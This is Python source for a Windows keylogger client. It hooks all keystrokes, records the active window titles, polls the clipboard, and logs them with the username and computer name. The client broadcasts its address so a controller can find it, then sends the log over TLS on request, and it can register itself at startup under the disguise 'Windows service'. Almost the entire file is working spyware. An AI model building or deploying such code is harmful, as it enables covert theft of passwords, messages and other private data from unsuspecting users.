from socket import *
from time import sleep
from tempfile import NamedTemporaryFile
from utils import *
from constants import *
import pyHook
import pythoncom
import win32gui
import win32clipboard
from sys import argv
from getpass import getuser
from os.path import realpath
from os import environ
from datetime import datetime
from threading import Thread, Lock
import ssl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from string import printable


def broadcast_myself():
    """
    Repeatedly broadcasts the client so the controller will find it. All encrypted.
    """
    global BD_PORT, BD_INTERVAL, conn, cipher_rsa
    BDs = socket(AF_INET, SOCK_DGRAM)
    while True:
        if not connected:
            BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
            localIP = gethostbyname(gethostname())
            BDs.sendto(cipher_rsa.encrypt(localIP), ("<broadcast>", BD_PORT))
        sleep(BD_INTERVAL)
    BDs.close()


def listen():
    """
    Listens for incoming connection by the serber and sends him the keylog when requested. All encrypted.
    """
    global FILE_NAME, connected, file_handle, file_lock, text_buffer
    listener = socket(AF_INET, SOCK_STREAM)
    set_keepalive(listener)
    listener.bind(("", HOST_PORT))
    listener.listen(1)
    while True:
        conn, _ = listener.accept()
        connected = True
        conn = ssl.wrap_socket(
            sock=conn, ca_certs="cert.pem", cert_reqs=ssl.CERT_REQUIRED)
        conn = Message_socket(_sock=conn)
        while True:
            try:
                if conn.recv_msg() != "send file":
                    continue
                with file_lock:
                    file_handle.seek(0)
                    data = file_handle.read()
                    conn.send_msg(data)
                    file_handle.close()
                    file_handle = open(FILE_NAME, "w+")
                write_to_file()
            except (timeout, error):
                conn.close()
                connected = False
                break
    listener.close()


def header(text):
    """
    Formats the input to a header style

    Args:
        text: text to format

    Returns:
        formatted text
    """
    return "\n{0}\n{1}{2}{1}\n{0}\n".format("=" * (len(text) + 20),
                                            " " * (((len(text) + 20) / 2) - (len(text) / 2)), text)


def write_to_file():
    """
    Writes the text buffer into the keylog file

    Returns:
        True if succeeded writing False otherwise
    """
    global text_buffer, file_handle, file_lock
    if file_lock.acquire(False):
        file_handle.write(text_buffer)
        file_lock.release()
        text_buffer = ""
        return True
    return False


def clipboard_listener():
    """
    Polls the clipboard and outputs it to the buffer when changed
    """
    global text_buffer, CLIP_POLL_RATE
    last_clip = ""
    while True:
        win32clipboard.OpenClipboard()
        try:
            curr_clip = win32clipboard.GetClipboardData(
                win32clipboard.CF_UNICODETEXT)
        except:
            curr_clip = last_clip
        win32clipboard.CloseClipboard()
        if curr_clip != last_clip:
            text_buffer += header("START CLIPBOARD")
            text_buffer += curr_clip
            text_buffer += header("END CLIPBOARD")
            last_clip = curr_clip
            write_to_file()
        sleep(CLIP_POLL_RATE)


def on_key_down(event):
    """
    Records all keyboard ebents and in which program they were sent and outputs them to the buffer nicely formatted

    Args:
        event: keyboard ebent
    """
    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG
    modifiers = get_modifiers()
    curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
    un_char = ToUnicode(event.KeyID)
    if DEBUG:
        print("Modifiers", modifiers)
        print("Unicode:", un_char)
        print("Virtual Key:", event.KeyID)
        print("Ascii:", event.Ascii, chr(event.Ascii))
        print("Description:", event.Key)
    if curr_win != last_win:
        text_buffer += header(curr_win)
        last_win = curr_win
    if un_char["code"] == 1 and chr(event.Ascii) in printable[:-5] and not modifiers["ctrl"]:
        text_buffer += un_char["char"]
    elif event.Key not in BANNED_BUTTONS:
        text_buffer += "{%s}" % ("".join(
            [mod.upper() + "+" for mod in modifiers.keys() if modifiers[mod]]) + event.Key)
    write_to_file()
    return True


if __name__ == "__main__":
    DEBUG = True
    BD_INTERVAL = 2
    CLIP_POLL_RATE = 5
    FILE_NAME = NamedTemporaryFile(delete=False).name
    if DEBUG:
        print(FILE_NAME)
    STARTUP = False
    STARTUP_NAME = "Windows service"
    CERT_FILE = "cert.pem"
    BANNED_BUTTONS = ["Apps", "Lshift", "Rshift", "Lmenu",
                      "Rmenu", "Lcontrol", "Rcontrol", "Capital"]

    connected = False
    text_buffer = ""
    last_win = ""

    if STARTUP:
        register_startup(STARTUP_NAME, realpath(argv[0]))

    public_key = RSA.import_key(open(CERT_FILE).read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    file_lock = Lock()
    file_handle = open(FILE_NAME, "w+")
    file_handle.write(header("KEYLOG STARTED AT {time} BY USER {user} ON {computer}".format(
        time=datetime.now().strftime("%d.%m.%Y %H:%M:%S"), user=getuser(), computer=environ['COMPUTERNAME'])))

    Thread(target=broadcast_myself).start()
    Thread(target=listen).start()
    Thread(target=clipboard_listener).start()
    hm = pyHook.HookManager()
    hm.KeyDown = on_key_down
    hm.HookKeyboard()
    pythoncom.PumpMessages()
